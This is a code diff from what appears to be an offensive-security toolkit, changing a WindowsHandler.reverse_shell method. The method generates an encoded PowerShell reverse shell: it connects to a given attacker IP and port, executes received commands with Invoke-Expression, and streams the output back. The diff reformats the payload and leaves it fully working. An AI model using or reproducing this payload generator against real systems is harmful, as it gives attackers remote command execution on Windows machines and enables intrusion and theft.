@@ -657,11 +657,20 @@ class WindowsHandler(OSHandler):
 
     def reverse_shell(self, ip_addr: str, port: int = 443, shell: str = None) -> str:
         if shell.lower() == "powershell":
-            revshell_command = f"$client = New-Object System.Net.Sockets.TCPClient('{ip_addr}',{port});"
-            revshell_command += "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
-            revshell_command += "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
-            revshell_command += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);"
-            revshell_command += "$stream.Flush()};$client.Close()"
+            revshell_command = f"""
+            $client = New-Object System.Net.Sockets.TCPClient('{ip_addr}',{port});
+            $stream = $client.GetStream();
+            [byte[]]$bytes = 0..65535|%{{0}};
+            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+                $data = ([System.Text.Encoding]::ASCII).GetString($bytes,0, $i);
+                $sendback = (Invoke-Expression $data 2>&1 | Out-String);
+                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+                $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);
+                $stream.Write($sendbyte,0,$sendbyte.Length);
+                $stream.Flush()
+            }};
+            $client.Close();
+            """
 
             revshell_command = (
                 f"powershell -e {utils.base64_for_powershell(revshell_command)}"
